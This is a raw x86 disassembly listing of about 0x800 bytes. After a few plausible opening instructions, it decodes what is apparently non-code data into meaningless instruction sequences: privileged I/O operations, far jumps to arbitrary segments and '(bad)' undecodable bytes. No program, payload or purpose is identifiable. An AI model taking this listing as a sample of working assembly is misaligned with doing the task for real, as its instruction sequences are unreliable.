  41637c:	mov    edx,DWORD PTR [ebp-0x8]
  41637f:	mov    ebx,DWORD PTR [ebp-0xc]
  416382:	jmp    0x418708
  416387:	nop
  416388:	test   BYTE PTR [ebp-0x643e8c3e],0xf4
  41638f:	add    DWORD PTR [ebp-0x5d],esp
  416392:	out    0x83,eax
  416394:	cmp    BYTE PTR [edx],bl
  416396:	retf   
  416397:	pop    esp
  416398:	push   edi
  416399:	jns    0x416415
  41639b:	add    DWORD PTR [edi+0x7a],ebx
  41639e:	jp     0x4163ad
  4163a0:	nop
  4163a1:	push   0x9cb19dd
  4163a6:	inc    esi
  4163a7:	add    DWORD PTR [ebx+ebp*1+0x58],edi
  4163ab:	outs   dx,DWORD PTR ds:[esi]
  4163ac:	je     0x4163fd
  4163ae:	pop    es
  4163af:	mul    ebp
  4163b1:	test   ebp,eax
  4163b3:	imul   ebx,DWORD PTR [edx+0x6f],0x14
  4163b7:	push   0xffffffeb
  4163b9:	mov    BYTE PTR [edx+0x3b],bh
  4163bc:	frstor [edx+0x69471d58]
  4163c2:	jmp    0xbc8c29ca
  4163c7:	dec    ebp
  4163c8:	repz add ecx,0x7af45f82
  4163cf:	push   ss
  4163d0:	loop   0x416404
  4163d2:	dec    esi
  4163d3:	fstp   QWORD PTR [ecx+eiz*4-0x2dfddb0b]
  4163da:	aaa    
  4163db:	fstp   DWORD PTR [ecx+esi*4+0x67]
  4163df:	pop    ebp
  4163e0:	hlt    
  4163e1:	int3   
  4163e2:	xor    DWORD PTR [edi],esi
  4163e4:	inc    ecx
  4163e5:	and    BYTE PTR [edx-0xdb053d0],cl
  4163eb:	mov    esi,0xe2a33cca
  4163f0:	das    
  4163f1:	or     BYTE PTR [esp+ebp*2-0x47],dh
  4163f5:	jo     0x41644f
  4163f7:	or     cl,BYTE PTR ds:0x9d032f1f
  4163fd:	mov    edi,0x11b03309
  416402:	lahf   
  416403:	sti    
  416404:	ins    DWORD PTR es:[edi],dx
  416405:	cmp    ecx,DWORD PTR [ebx]
  416407:	adc    esp,DWORD PTR [edx-0x36]
  41640a:	push   cs
  41640b:	ret    0x327a
  41640e:	clc    
  41640f:	xor    DWORD PTR [eax],ebp
  416411:	outs   dx,BYTE PTR ds:[esi]
  416412:	stc    
  416413:	cld    
  416414:	enter  0xfc06,0x38
  416418:	fst    QWORD PTR [esi-0x4f]
  41641b:	push   0xfffffffd
  41641d:	pusha  
  41641e:	ds inc ecx
  416420:	aad    0x42
  416422:	pop    es
  416423:	jmp    0x416453
  416425:	push   cs
  416426:	inc    eax
  416427:	push   ebx
  416428:	mov    esp,DWORD PTR [edi]
  41642a:	jne    0x416482
  41642c:	ins    BYTE PTR es:[edi],dx
  41642d:	push   DWORD PTR [eax+0x2c]
  416430:	mov    ebx,DWORD PTR [ecx+0x5cb805b1]
  416436:	lds    ebx,FWORD PTR [ebx-0x5c8ae700]
  41643c:	std    
  41643d:	jno    0x41643a
  41643f:	pop    esp
  416440:	cli    
  416441:	imul   ebx,DWORD PTR [eax+0x20],0xf
  416445:	mov    bl,BYTE PTR [esi+0xeba1c6a]
  41644b:	inc    esp
  41644c:	sbb    BYTE PTR [edi-0x19],bh
  41644f:	test   DWORD PTR es:[ebp-0x77],0x7fc0d258
  416457:	and    ah,bh
  416459:	pop    esp
  41645a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41645b:	mov    ah,bh
  41645d:	and    eax,0xac0b12c3
  416462:	fwait
  416463:	mov    eax,0x63f91204
  416468:	mov    ch,BYTE PTR [edx+0x76777c35]
  41646e:	and    esi,DWORD PTR [esi+ecx*4]
  416471:	iret   
  416472:	scas   eax,DWORD PTR es:[edi]
  416473:	clc    
  416474:	mov    es,WORD PTR [ebx]
  416476:	add    esi,ecx
  416478:	adc    al,0x3
  41647a:	popf   
  41647b:	inc    ebp
  41647c:	add    BYTE PTR [ecx+esi*8-0x23],bl
  416480:	cld    
  416481:	jns    0x4164d7
  416483:	jne    0x4164d3
  416485:	xchg   ebp,eax
  416486:	mov    ds:0xb851049,eax
  41648b:	or     DWORD PTR [edx],ebp
  41648d:	(bad)  
  41648e:	loop   0x4164bd
  416490:	jns    0x416444
  416492:	mov    al,0xfb
  416494:	ret    
  416495:	or     esi,DWORD PTR [ebx+0x24]
  416498:	cmp    al,0x5f
  41649a:	jno    0x4164ef
  41649c:	(bad)  [ecx+0x5a005a5]
  4164a2:	sub    BYTE PTR [ebx],0x2d
  4164a5:	das    
  4164a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4164a7:	or     DWORD PTR [edx],ebp
  4164a9:	scas   al,BYTE PTR es:[edi]
  4164aa:	retf   
  4164ab:	data16 and BYTE PTR [ebp+0x51c93c78],dh
  4164b2:	xchg   esi,eax
  4164b3:	sbb    al,0x9f
  4164b5:	loope  0x41652e
  4164b7:	sub    eax,0xcc04db81
  4164bc:	pop    esi
  4164bd:	ins    BYTE PTR es:[edi],dx
  4164be:	(bad)  
  4164bf:	push   esp
  4164c0:	adc    dh,BYTE PTR [edi+0x3d]
  4164c3:	rol    BYTE PTR [esi+0xd2d34db],0xe9
  4164ca:	mov    ebp,0x7931acca
  4164cf:	pop    ss
  4164d0:	cld    
  4164d1:	inc    esi
  4164d2:	mov    ?,WORD PTR ds:0x3ec15ad7
  4164d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4164d9:	sti    
  4164da:	inc    esp
  4164db:	fcom   DWORD PTR [esi-0x6c896760]
  4164e1:	pop    esi
  4164e2:	mov    al,0x88
  4164e4:	test   BYTE PTR [edx-0x19],0x42
  4164e8:	rcl    BYTE PTR [edi-0x799be2dc],cl
  4164ee:	rcl    ah,cl
  4164f0:	call   DWORD PTR [esi]
  4164f2:	test   eax,0x90de2dff
  4164f7:	jmp    0x5ce2:0x7c3916c4
  4164fe:	ret    0x4752
  416501:	into   
  416502:	or     ch,BYTE PTR [esp+ebx*8-0x7a]
  416506:	jmp    0xa696:0x2f70ad3d
  41650d:	jns    0x416530
  41650f:	mov    edx,0xd8fda1d3
  416514:	sub    eax,0x216b12d0
  416519:	out    dx,al
  41651a:	in     eax,dx
  41651b:	clc    
  41651c:	pop    ecx
  41651d:	test   DWORD PTR [ebp-0x26],ecx
  416520:	xchg   esp,eax
  416521:	test   BYTE PTR [eax+edi*1-0x6b],cl
  416525:	jno    0x41655c
  416527:	pop    esi
  416528:	cmp    BYTE PTR [eax+edi*4-0x7c28c9b3],cl
  41652f:	cmp    DWORD PTR [ebx],edx
  416531:	stos   BYTE PTR es:[edi],al
  416532:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416533:	out    0x5b,eax
  416535:	dec    ebx
  416536:	cli    
  416537:	fbld   TBYTE PTR [edi-0x38]
  41653a:	in     eax,dx
  41653b:	popa   
  41653c:	push   ebx
  41653d:	cdq    
  41653e:	cmp    eax,0x828bbf4d
  416543:	or     DWORD PTR [edx+0x4d],eax
  416546:	xchg   ecx,eax
  416547:	das    
  416548:	inc    edx
  416549:	ins    BYTE PTR es:[edi],dx
  41654a:	mov    dh,0xb7
  41654c:	jmp    0x41654d
  41654e:	inc    ebp
  41654f:	or     cl,BYTE PTR [ecx-0x6feae3a]
  416555:	lds    ebx,FWORD PTR [ebp-0x42]
  416558:	cmp    BYTE PTR [eax],bh
  41655a:	call   0x367e:0x7fb8074f
  416561:	and    al,0x9
  416563:	sbb    eax,0x63e9a004
  416568:	test   DWORD PTR [ebp-0x3d],eax
  41656b:	add    al,0x2c
  41656d:	rcl    BYTE PTR [eax+eiz*1],1
  416570:	sub    DWORD PTR [ebx+0x6ce4514e],0xe20900a2
  41657a:	call   0x5f62:0x720ec207
  416581:	mov    al,0x1f
  416583:	add    cl,BYTE PTR [edi+0x43]
  416586:	mov    bl,0xd8
  416588:	cmp    bl,cl
  41658a:	or     eax,0x3f41184f
  41658f:	mov    eax,ds:0xc93afa1b
  416594:	stos   DWORD PTR es:[edi],eax
  416595:	inc    esi
  416596:	enter  0xc8c5,0x31
  41659a:	dec    edi
  41659b:	pop    ecx
  41659c:	fisub  WORD PTR [esi]
  41659e:	jl     0x4165db
  4165a0:	fld    QWORD PTR [edx+0x6f006f7f]
  4165a6:	into   
  4165a7:	push   ebp
  4165a8:	sbb    al,0xdb
  4165aa:	in     eax,dx
  4165ab:	sub    BYTE PTR [ecx],bl
  4165ad:	mov    esi,0xbb20debb
  4165b2:	pop    edx
  4165b3:	adc    edx,DWORD PTR [edx-0x1ac352f7]
  4165b9:	es popa 
  4165bb:	hlt    
  4165bc:	je     0x4165f1
  4165be:	(bad)  
  4165bf:	sub    ebx,DWORD PTR [esi]
  4165c1:	ret    0xeb14
  4165c4:	inc    eax
  4165c5:	jno    0x41656d
  4165c7:	jo     0x416639
  4165c9:	and    DWORD PTR [eax],0xffffff96
  4165cc:	cmp    BYTE PTR [esi+0x1f],dl
  4165cf:	bnd jbe 0x416601
  4165d2:	cld    
  4165d3:	sub    al,0x28
  4165d5:	xadd   eax,edi
  4165d8:	fwait
  4165d9:	add    BYTE PTR [ecx+0xe],dl
  4165dc:	pop    edx
  4165dd:	add    edi,ebx
  4165df:	xor    al,0x79
  4165e1:	es fst st(1)
  4165e4:	cli    
  4165e5:	cli    
  4165e6:	push   edx
  4165e7:	call   0xcdc9:0x5163ad3a
  4165ee:	retf   0x669c
  4165f1:	dec    esp
  4165f2:	int3   
  4165f3:	sbb    ebp,DWORD PTR [ecx-0x49563575]
  4165f9:	add    DWORD PTR [edi],esp
  4165fb:	mov    eax,0x7cacb453
  416600:	imul   ecx,edx,0xa9559a1
  416606:	sub    ch,dh
  416608:	clc    
  416609:	retf   
  41660a:	jmp    0x188:0x9aa8f1b7
  416611:	addr16 mov dh,0xbe
  416614:	lds    esi,FWORD PTR [eax+0x63]
  416617:	pop    edi
  416618:	(bad)  
  416619:	fiadd  DWORD PTR [ebx-0x2ad79e5f]
  41661f:	inc    eax
  416620:	mov    bh,0x57
  416622:	xchg   edx,eax
  416623:	aaa    
  416624:	dec    edx
  416625:	or     al,0xeb
  416627:	mov    dl,cl
  416629:	cmp    BYTE PTR [ecx],dl
  41662b:	es push cs
  41662d:	dec    eax
  41662e:	ins    DWORD PTR es:[edi],dx
  41662f:	mov    ch,0x41
  416631:	and    esi,ebx
  416633:	outs   dx,DWORD PTR ds:[esi]
  416634:	stc    
  416635:	pop    edx
  416636:	jno    0x416679
  416638:	stos   DWORD PTR es:[edi],eax
  416639:	out    dx,eax
  41663a:	call   0x198:0x9e01a776
  416641:	mov    esi,0x5132ad0
  416646:	in     eax,dx
  416647:	jo     0x41665a
  416649:	jp     0x4166a2
  41664b:	repz and ah,BYTE PTR [esp+ebx*8+0x7e]
  416650:	xor    al,dh
  416652:	repnz into 
  416654:	push   cs
  416655:	pusha  
  416656:	mov    ah,0xfa
  416658:	push   ebp
  416659:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41665a:	pop    ecx
  41665b:	js     0x41669d
  41665d:	imul   edi,DWORD PTR [esi+0x147f1ea1],0x858a982e
  416667:	addr16 mov bh,0x28
  41666a:	adc    eax,0xe61d38c8
  41666f:	aaa    
  416670:	sbb    DWORD PTR [ebx-0x20],esp
  416673:	lock mov dl,0x3a
  416676:	sahf   
  416677:	pop    ebp
  416678:	add    edi,DWORD PTR [esi+0x39c08be5]
  41667e:	pop    ebp
  41667f:	mov    eax,0xd14a504f
  416684:	nop    edi
  416687:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416688:	push   0x8f5f5b5e
  41668d:	pop    ecx
  41668e:	daa    
  41668f:	lea    ebp,[esi]
  416691:	jbe    0x4166ea
  416693:	push   ebp
  416694:	sets   BYTE PTR [eax+eax*2-0x245f3de2]
  41669c:	push   es
  41669d:	test   al,0x11
  41669f:	stos   DWORD PTR es:[edi],eax
  4166a0:	mov    eax,ds:0xc2c8d116
  4166a5:	jb     0x41664c
  4166a7:	xor    DWORD PTR [ebx],0xa
  4166aa:	jp     0x41663d
  4166ac:	inc    ebx
  4166ad:	mov    bl,0x45
  4166af:	mov    edi,0x81a17758
  4166b4:	shr    DWORD PTR [esi-0x7b],1
  4166b7:	xor    DWORD PTR [edx],ebx
  4166b9:	mov    ds:0xa0e2783c,eax
  4166be:	jg     0x416703
  4166c0:	imul   eax,DWORD PTR [eax+0x7768f079],0x41
  4166c7:	and    esp,DWORD PTR [edx+0xb]
  4166ca:	mov    ebx,0x8f41c117
  4166cf:	xor    eax,0xb0263e4d
  4166d4:	fbstp  TBYTE PTR gs:[ecx]
  4166d7:	call   0x8833:0x929cc971
  4166de:	inc    edx
  4166df:	pop    eax
  4166e0:	cmc    
  4166e1:	je     0x4166e7
  4166e3:	xchg   ecx,eax
  4166e4:	outs   dx,DWORD PTR ds:[esi]
  4166e5:	cdq    
  4166e6:	adc    esi,DWORD PTR [edi+eax*8]
  4166e9:	out    0xbc,eax
  4166eb:	xchg   DWORD PTR [esi],ecx
  4166ed:	outs   dx,BYTE PTR ds:[esi]
  4166ee:	mov    ebx,0xb02ee0b5
  4166f3:	imul   edi,DWORD PTR [ebp-0x69f7d281],0x6b
  4166fa:	jne    0x4166c2
  4166fc:	inc    esp
  4166fd:	aas    
  4166fe:	loope  0x416761
  416700:	je     0x416764
  416702:	sub    dh,ah
  416704:	dec    esi
  416705:	xor    al,0x4c
  416707:	mov    ds:0x992de6e3,eax
  41670c:	pop    es
  41670d:	aad    0xf1
  41670f:	test   al,0x44
  416711:	out    0x73,eax
  416713:	clc    
  416714:	push   0x228628a5
  416719:	mov    dl,0x60
  41671b:	arpl   WORD PTR [edi],bp
  41671d:	test   eax,0xfbfce624
  416722:	in     al,dx
  416723:	sub    edi,eax
  416725:	loopne 0x41675a
  416727:	cwde   
  416728:	adc    DWORD PTR [edi+edx*4],0xffffff85
  41672c:	scas   eax,DWORD PTR es:[edi]
  41672d:	out    dx,eax
  41672e:	pop    ss
  41672f:	push   ss
  416730:	dec    ebp
  416731:	fsubr  QWORD PTR [ecx-0x6be8e9f3]
  416737:	xchg   ebx,eax
  416738:	cmp    al,0x78
  41673a:	gs inc edx
  41673c:	jge    0x41674d
  41673e:	push   esi
  41673f:	push   ecx
  416740:	push   eax
  416741:	push   esi
  416742:	mov    al,ds:0xa60b80a1
  416747:	and    eax,DWORD PTR [ecx+edi*2+0x746fdf62]
  41674e:	mov    eax,0x97c37179
  416753:	inc    edx
  416754:	mov    ebp,0x795cb85
  416759:	push   0xce69d82e
  41675e:	sbb    eax,0xf5971fb1
  416763:	jl     0x416775
  416765:	cmp    al,0xe9
  416767:	add    ch,0x61
  41676a:	add    BYTE PTR [ebx],0xa8
  41676d:	mov    ebx,0xbee565a0
  416772:	xor    BYTE PTR [edx-0x62354ce8],bh
  416778:	push   ecx
  416779:	jns    0x4167a9
  41677b:	push   0x55
  41677d:	jle    0x416720
  41677f:	jb     0x4167bf
  416781:	in     eax,dx
  416782:	pop    ebx
  416783:	retf   
  416784:	cdq    
  416785:	mov    ebp,0xc35e0720
  41678a:	xchg   ebp,eax
  41678b:	call   0x7c90708a
  416790:	aad    0x34
  416792:	or     al,0xd5
  416795:	mov    cl,0x42
  416797:	pop    ecx
  416798:	or     edx,edx
  41679a:	mov    DWORD PTR [edx],edx
  41679c:	les    cx,DWORD PTR [esp+eax*1+0x495cf491]
  4167a4:	ret    0xd020
  4167a7:	mov    ecx,0x46fbdedf
  4167ac:	jno    0xa8d2fe7
  4167b2:	jmp    0xc9fee86b
  4167b7:	test   esp,0xc739044b
  4167bd:	sub    DWORD PTR [ebp-0x48dfe2ae],edx
  4167c3:	std    
  4167c4:	adc    BYTE PTR [eax-0x12],bl
  4167c7:	vsubsd xmm1,xmm1,QWORD PTR [edi+0xa]
  4167cc:	test   eax,0xef46de82
  4167d1:	loop   0x41675a
  4167d3:	pushf  
  4167d4:	dec    ecx
  4167d5:	bound  ecx,QWORD PTR ds:0x132cd0c5
  4167db:	aam    0xac
  4167dd:	in     eax,dx
  4167de:	jle    0x4167c0
  4167e0:	pop    esp
  4167e1:	push   cs
  4167e2:	lds    ebx,FWORD PTR [ebp+0x1e]
  4167e5:	(bad)  
  4167e6:	pop    edx
  4167e8:	push   eax
  4167e9:	dec    ecx
  4167ea:	sub    al,0x32
  4167ec:	rol    BYTE PTR [edx-0x5ca335e9],0x1f
  4167f3:	out    0x9b,al
  4167f5:	enter  0xac14,0xec
  4167f9:	add    al,0xa1
  4167fb:	int3   
  4167fc:	mov    ebx,0xb3de4ade
  416801:	push   edx
  416802:	ins    DWORD PTR es:[edi],dx
  416803:	xor    DWORD PTR [edx+0x343dc151],0x1eff4155
  41680d:	sbb    ebx,DWORD PTR ds:0xc1d94fb5
  416813:	sub    DWORD PTR [eax-0x2d],edx
  416816:	mov    BYTE PTR fs:[edx],al
  416819:	mov    ah,0x4b
  41681b:	(bad)  
  41681c:	fcom   QWORD PTR [ebx]
  41681e:	pop    edx
  41681f:	(bad)  
  416820:	and    DWORD PTR [edi-0x77772b6d],ebp
  416826:	jnp    0x4167cb
  416828:	sub    DWORD PTR [edx-0x309700ca],edi
  41682e:	call   0x3a1e0d85
  416833:	cmp    eax,0x15c7a61b
  416838:	push   esp
  416839:	xchg   esp,eax
  41683a:	xor    eax,DWORD PTR [edx]
  41683c:	xchg   esp,eax
  41683d:	sbb    eax,ebx
  41683f:	cs pop ds
  416841:	push   ecx
  416842:	jle    0x416870
  416844:	inc    esp
  416845:	jge    0x416817
  416847:	mov    dh,0xec
  416849:	les    ecx,FWORD PTR [ebx]
  41684b:	pop    ds
  41684c:	adc    eax,DWORD PTR [ecx+esi*2-0x20]
  416850:	lock scas al,BYTE PTR es:[edi]
  416852:	pop    edx
  416853:	mov    bh,BYTE PTR [edi+0x70]
  416856:	call   0x745b:0xf0c1c505
  41685d:	or     esi,ebx
  41685f:	and    al,0x16
  416861:	mov    BYTE PTR [esi-0x68ed4186],0xf
  416868:	xchg   ecx,eax
  41686a:	fld    QWORD PTR [esi+edx*2]
  41686d:	pop    eax
  41686e:	iret   
  41686f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416870:	dec    edx
  416871:	xchg   ebx,eax
  416872:	cmp    bp,di
  416875:	test   BYTE PTR [edx+0x1949b10c],bh
  41687b:	lock mov ch,0x46
  41687e:	sbb    al,0x1b
  416880:	pop    esi
  416881:	sub    eax,0xa4ac59d8
  416886:	xchg   esi,eax
  416887:	out    dx,eax
  416888:	cwde   
  416889:	pop    edi
  41688a:	sub    dl,ch
  41688c:	out    dx,eax
  41688d:	mov    edx,0xf12a5107
  416892:	sbb    BYTE PTR [esi],0x5
  416895:	dec    edx
  416896:	fisubr WORD PTR [eax-0x7b]
  416899:	ins    BYTE PTR es:[edi],dx
  41689a:	xor    BYTE PTR [ebp+0x1e],dl
  41689d:	xor    BYTE PTR [esi+0xd],dl
  4168a0:	fsubr  DWORD PTR [eax-0x79]
  4168a3:	jmp    0xd82e5cd6
  4168a8:	dec    esp
  4168a9:	dec    esp
  4168aa:	add    BYTE PTR [edi+0x6],ch
  4168ad:	push   0x17f310d6
  4168b2:	call   0x451c9e44
  4168b7:	sbb    dh,bl
  4168b9:	sbb    BYTE PTR [ebx],ah
  4168bb:	jbe    0x41692d
  4168bd:	mov    eax,ds:0xe46c2c82
  4168c2:	jmp    0x41690a
  4168c4:	test   BYTE PTR [esi],dl
  4168c6:	adc    al,BYTE PTR [ebp-0x22]
  4168c9:	mov    ds:0x8765aaa3,al
  4168ce:	int    0xaa
  4168d0:	imul   ebp,DWORD PTR ds:0x26b1d896,0xffffffbf
  4168d7:	les    esi,FWORD PTR [edi-0x3c51d751]
  4168dd:	(bad)  
  4168de:	bound  edx,QWORD PTR [ebx]
  4168e0:	je     0x41694a
  4168e2:	and    al,0x24
  4168e4:	cmp    cl,BYTE PTR [esi-0x405b61a4]
  4168ea:	push   DWORD PTR [esp+edx*4]
  4168ed:	test   ax,0xd42f
  4168f1:	mov    ecx,0xd09dd425
  4168f6:	adc    BYTE PTR ds:0xaf98f20e,al
  4168fc:	imul   esi,esp,0x3db43039
  416902:	mov    cl,0x59
  416904:	push   0x34
  416906:	fcom   DWORD PTR [ecx]
  416908:	retf   
  416909:	pop    esi
  41690a:	jnp    0x416927
  41690c:	cdq    
  41690d:	scas   eax,DWORD PTR es:[edi]
  41690e:	push   edi
  41690f:	inc    esi
  416910:	mov    ch,0xce
  416912:	xchg   ecx,eax
  416913:	cdq    
  416914:	adc    al,0x24
  416916:	scas   eax,DWORD PTR es:[edi]
  416917:	lahf   
  416918:	fld    QWORD PTR [ebx]
  41691a:	call   0x10176199
  41691f:	mov    fs,eax
  416921:	add    ebp,DWORD PTR [esi+ecx*1-0x3262f1aa]
  416928:	and    al,0xfb
  41692a:	sbb    BYTE PTR [edx-0x3f],dh
  41692d:	sbb    bl,BYTE PTR [ecx+0x361fbc8f]
  416933:	push   ecx
  416934:	or     al,ah
  416936:	cmp    DWORD PTR ds:0xa1970aac,esp
  41693c:	xchg   ebx,eax
  41693d:	jo     0x416943
  41693f:	dec    ebx
  416940:	arpl   WORD PTR [edi],cx
  416942:	imul   edi,DWORD PTR [edx+0x4158a92c],0xc0e8fc22
  41694c:	fsub   QWORD PTR [edx-0x40]
  41694f:	pop    ss
  416950:	dec    esi
  416951:	mov    cl,0xef
  416953:	pop    edi
  416954:	jmp    0x4597:0x2afa379e
  41695b:	xor    DWORD PTR [edx-0x2c],ecx
  41695e:	or     BYTE PTR [ebx+0x3b1b4cd4],bl
  416964:	push   ebp
  416965:	inc    esp
  416966:	mov    ebx,0x9d617ea1
  41696b:	sub    cl,bl
  41696d:	mov    dh,0xef
  41696f:	inc    ebp
  416970:	aad    0x82
  416972:	add    edi,DWORD PTR [edi+0x70c8b369]
  416978:	push   cs
  416979:	add    bl,BYTE PTR [eax]
  41697b:	rol    al,0x90
  41697e:	lock adc esi,edx
  416981:	cmp    eax,DWORD PTR [eax+0x4a]
  416984:	and    edi,ebp
  416986:	and    eax,0x9613baf4
  41698b:	cmp    dh,bl
  41698d:	and    BYTE PTR [ecx+0x174137ef],bh
  416993:	jns    0x416a08
  416995:	or     eax,DWORD PTR [ebx+0x4b]
  416998:	add    al,0x4f
  41699a:	in     eax,0x2c
  41699c:	push   ss
  41699d:	push   ds
  41699e:	mov    ecx,DWORD PTR [ebp-0x21]
  4169a1:	adc    eax,0xd933cdec
  4169a6:	fimul  WORD PTR [edx+edi*1+0x4c]
  4169aa:	jmp    0x416995
  4169ac:	or     BYTE PTR [ebp+0x5384d40f],bh
  4169b2:	push   cs
  4169b3:	inc    eax
  4169b4:	shr    cl,1
  4169b6:	or     BYTE PTR [edx+edx*8+0x6e],dl
  4169ba:	cwde   
  4169bb:	pop    esi
  4169bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169bd:	jl     0x416988
  4169bf:	aam    0x6f
  4169c1:	fxch   st(4)
  4169c3:	sub    bh,BYTE PTR [edi]
  4169c5:	push   esi
  4169c6:	test   edi,esp
  4169c8:	dec    ecx
  4169c9:	imul   esi,DWORD PTR [edi+ebx*1-0x1a],0xf6d95cff
  4169d1:	cmp    BYTE PTR [edx],cl
  4169d3:	pop    esi
  4169d4:	and    bh,BYTE PTR [ebx+ebp*8+0x7c]
  4169d8:	or     eax,0x99e90158
  4169dd:	outs   dx,BYTE PTR ds:[esi]
  4169de:	xchg   ecx,eax
  4169df:	cmp    al,0xc0
  4169e1:	outs   dx,DWORD PTR ds:[esi]
  4169e2:	or     esi,DWORD PTR [edi]
  4169e4:	aas    
  4169e5:	push   cs
  4169e6:	(bad)  
  4169e7:	shl    BYTE PTR cs:[ebx+esi*8],0xb5
  4169ec:	call   0xc260:0x16277681
  4169f3:	or     BYTE PTR [ecx+0x4],dh
  4169f6:	jne    0x4169b6
  4169f8:	test   DWORD PTR [esi-0x42],esi
  4169fb:	or     esi,ecx
  4169fd:	repnz popa 
  4169ff:	icebp  
  416a00:	(bad)  
  416a01:	push   ebp
  416a02:	mov    dl,BYTE PTR [edi]
  416a04:	sbb    esi,edx
  416a06:	inc    ebp
  416a07:	into   
  416a08:	dec    ebx
  416a09:	dec    esp
  416a0a:	sub    dl,BYTE PTR [eax+eiz*4]
  416a0d:	xor    edx,0x44
  416a10:	gs pop esp
  416a12:	mov    cl,0x5a
  416a14:	sub    esi,DWORD PTR [ebx+eiz*2-0x7f049927]
  416a1b:	mov    dh,0xbf
  416a1d:	mov    bh,0x10
  416a1f:	(bad)  
  416a20:	das    
  416a21:	stos   BYTE PTR es:[edi],al
  416a22:	mov    eax,ds:0x546de179
  416a27:	push   ebp
  416a28:	sub    eax,esi
  416a2a:	pop    esp
  416a2b:	xchg   esi,eax
  416a2c:	mov    ecx,0xff40ab39
  416a31:	or     al,cl
  416a33:	xchg   ecx,eax
  416a34:	mov    esi,ebp
  416a36:	retf   0x94bd
  416a39:	sbb    eax,DWORD PTR [ecx]
  416a3b:	push   cs
  416a3c:	sbb    al,BYTE PTR [esi+0x47]
  416a3f:	inc    esp
  416a40:	call   0x613f022
  416a45:	xor    edi,DWORD PTR [edx]
  416a47:	pusha  
  416a48:	xchg   esp,eax
  416a49:	push   ecx
  416a4a:	mov    ebp,0x33b64a3
  416a4f:	call   0xbe54:0x8d781783
  416a56:	icebp  
  416a57:	cmp    DWORD PTR [edx-0x7],esp
  416a5a:	jns    0x416a02
  416a5c:	and    al,0xca
  416a5e:	fdiv   QWORD PTR [esi+0x30]
  416a61:	outs   dx,DWORD PTR ds:[esi]
  416a62:	dec    eax
  416a63:	imul   eax,DWORD PTR [ebx+0x76446ebe],0xffffff8b
  416a6a:	cmp    ebx,DWORD PTR [ecx-0xfadeabe]
  416a70:	xchg   DWORD PTR [eax],eax
  416a72:	enter  0xffb7,0x5f
  416a76:	inc    ebp
  416a77:	aaa    
  416a78:	icebp  
  416a79:	gs popa 
  416a7b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a7c:	mov    ds:0x120d550,eax
  416a81:	je     0x416a26
  416a83:	cld    
  416a84:	shl    eax,cl
  416a86:	cmc    
  416a87:	pop    esi
  416a88:	sbb    ebx,esp
  416a8a:	mov    bl,0x7
  416a8c:	fsubr  QWORD PTR ds:0x3bac5d96
  416a92:	aaa    
  416a93:	add    al,0x48
  416a95:	xchg   BYTE PTR [edx+0x54],bl
  416a98:	mov    cl,0x44
  416a9a:	push   cs
  416a9b:	jp     0x416a96
  416a9d:	std    
  416a9e:	std    
  416a9f:	xor    ecx,ebp
  416aa1:	adc    esp,edx
  416aa3:	jecxz  0x416a2c
  416aa5:	in     eax,0x8f
  416aa7:	test   bl,ch
  416aa9:	enter  0x42c4,0x23
  416aad:	xor    BYTE PTR [ebx+esi*2+0x18],cl
  416ab1:	ss or  ch,bh
  416ab4:	sbb    DWORD PTR [esi+0x9aab9d2],edi
  416aba:	xor    al,BYTE PTR [ecx-0x79]
  416abd:	inc    ebp
  416abe:	imul   edx,DWORD PTR [edi-0x6b],0xa307aa4
  416ac5:	mov    ds:0x6d5bda7b,eax
  416aca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416acb:	rcl    BYTE PTR ds:0x511aef04,1
  416ad1:	mov    esp,0xe835ed2c
  416ad6:	push   cs
  416ad7:	jge    0x416b57
  416ad9:	mov    al,ds:0x1214025a
  416ade:	imul   eax,ecx,0xffffffe6
  416ae1:	fsub   DWORD PTR [edi+0x59]
  416ae4:	jl     0x416af4
  416ae6:	inc    edi
  416ae7:	icebp  
  416ae8:	fstp   TBYTE PTR [ecx+edx*2]
  416aeb:	mov    ecx,DWORD PTR [edx-0x66]
  416aee:	aas    
  416aef:	xchg   ebx,eax
  416af0:	pusha  
  416af1:	aaa    
  416af2:	mov    eax,ds:0x3968368f
  416af7:	(bad)  
  416af8:	imul   BYTE PTR [esi-0x22]
  416afb:	clc    
  416afc:	idiv   ch
  416afe:	xchg   ebx,eax
  416aff:	xchg   ebp,eax
  416b00:	jo     0x416b5f
  416b02:	jp     0x416b3d
  416b04:	stos   BYTE PTR es:[edi],al
  416b05:	fdiv   DWORD PTR [ebp-0x32750acc]
  416b0b:	out    0x51,al
  416b0d:	test   BYTE PTR [edx],al
  416b0f:	sbb    esp,DWORD PTR [edx+0x76]
  416b12:	mov    WORD PTR [edx+0x42a8776a],ds
  416b18:	xor    edx,edi
  416b1a:	(bad)  
  416b1b:	daa    
  416b1c:	retf   0x7c9b
  416b1f:	push   cs
  416b20:	mov    al,ds:0x96c3c31e
  416b25:	add    DWORD PTR [eax+0x54],esp
  416b28:	test   al,0x2c
  416b2a:	cmp    eax,0x3df84fd1
  416b2f:	nop
  416b30:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416b32:	out    dx,al
  416b33:	rol    eax,0x28
  416b36:	ins    BYTE PTR es:[edi],dx
  416b37:	(bad)  
  416b38:	xor    eax,0x63c22760
  416b3d:	(bad)  
  416b3e:	aas    
  416b3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b40:	inc    edi
  416b41:	popf   
  416b42:	fcomp  QWORD PTR [edi+0x4e599ec1]
  416b48:	shufps xmm7,XMMWORD PTR [edi],0x2a
  416b4c:	or     BYTE PTR [bp+si+0x61cc],dh
  416b51:	jl     0x416bcf
  416b53:	mov    edi,cs
  416b55:	xor    al,0x12
  416b57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b58:	jmp    0x416bb9
  416b5a:	lahf   
  416b5b:	mov    al,ds:0x194036e3
  416b60:	and    al,0x44
  416b62:	pop    eax
  416b63:	dec    ebp
  416b64:	ins    DWORD PTR es:[edi],dx
  416b65:	arpl   WORD PTR [esi+0x32],ax
  416b68:	sub    bh,ah
